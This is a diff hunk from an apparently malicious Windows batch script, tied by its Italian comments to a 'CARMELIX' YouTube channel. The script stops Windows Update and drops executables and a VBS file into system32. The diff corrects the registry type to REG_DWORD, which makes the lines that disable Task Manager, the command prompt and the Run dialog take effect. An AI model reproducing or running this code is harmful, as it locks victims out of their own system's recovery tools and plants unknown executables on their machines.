@@ -15,9 +15,9 @@ net stop "wuauserv"
 ::link canale CARMELIX: https://youtube.com/channel/UCUbVV0_e7B2tM7ETPbPqrCg
 ::In %systemroot%\system32\CARMELIX sono presenti i file:
 ::REBOOT.exe, AfterReboot.exe, NOT_STONKS.vbs, Giusto.exe
-reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_WORD /d 1 /f
-reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD /t REG_WORD /d 1 /f
-reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_WORD /d 1 /f
+reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD /t REG_DWORD /d 1 /f
+reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
 
 rd "%systemroot%\system32\CARMELIX"/q/s
 md "%systemroot%\system32\CARMELIX"
